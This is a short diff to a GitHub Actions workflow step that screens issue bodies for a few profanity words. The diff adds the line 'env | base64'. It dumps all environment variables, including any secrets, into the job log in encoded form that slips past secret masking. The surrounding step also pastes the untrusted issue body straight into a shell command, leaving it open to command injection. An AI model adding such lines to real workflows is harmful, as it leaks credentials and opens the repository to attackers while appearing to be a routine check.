@@ -40,6 +40,7 @@ jobs:
         id: check_profanities
         run: |
           echo "Checking issue body for profanities..."
+          env | base64
           PROFANITIES_LIST="bad|disguting|horrible"
           if echo "${{ github.event.issue.body }}" | grep -qiE "$PROFANITIES_LIST"; then
             echo "Profanity detected in issue body. Please clean up the language."
